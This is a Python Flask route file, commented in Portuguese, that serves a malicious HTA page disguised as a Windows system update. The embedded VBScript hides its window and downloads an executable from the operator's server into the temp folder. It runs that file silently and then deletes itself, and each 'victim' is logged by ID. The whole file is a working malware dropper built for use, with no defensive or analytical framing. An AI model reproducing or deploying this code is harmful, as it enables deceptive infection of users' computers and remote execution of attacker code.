from flask import Blueprint, abort, current_app, session
from app.utils.logging import log_event
import uuid

hta_bp = Blueprint('hta', __name__)


@hta_bp.route('/instalar/<payload>')
def instalar_hta(payload):
    """Entrega o HTA de forma stealth"""
    if payload not in current_app.config['PAYLOADS']:
        abort(404)

    victim_id = session.get("victim_id", uuid.uuid4().hex[:12])
    host = current_app.config['BASE_URL']

    hta_content = f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>System Update</title>
    <HTA:APPLICATION 
        APPLICATIONNAME="Windows Update"
        SHOWINTASKBAR="no"
        WINDOWSTATE="minimize"
        CAPTION="no"
        SCROLL="no"
        BORDER="none"
    />
    <script language="VBScript">
        On Error Resume Next
        Dim objShell, objHTTP, objStream, tempPath, filePath
        Set objShell = CreateObject("WScript.Shell")
        tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
        filePath = tempPath & "\\update-helper.exe"

        Set objHTTP = CreateObject("MSXML2.XMLHTTP")
        objHTTP.Open "GET", "{host}/get_rusta", False
        objHTTP.Send

        If objHTTP.Status = 200 Then
            Set objStream = CreateObject("ADODB.Stream")
            objStream.Open
            objStream.Type = 1
            objStream.Write objHTTP.responseBody
            objStream.SaveToFile filePath, 2
            objStream.Close

            objShell.Run """" & filePath & """", 0, False
            objShell.Run "cmd /c timeout 4 && del ""%~f0""", 0, False
        End If
        window.close
    </script>
</head>
<body style="background:#1e1e1e; color:#ccc; font-family:Segoe UI;">
    <div style="margin-top:40px; text-align:center;">
        <h3>Installing system components...</h3>
        <p>Please wait while we apply the latest updates.</p>
    </div>
</body>
</html>'''

    log_event(f"HTA ENTREGUE | Payload: {payload}", victim_id=victim_id, level="INFO")
    return hta_content, 200, {"Content-Type": "application/hta"}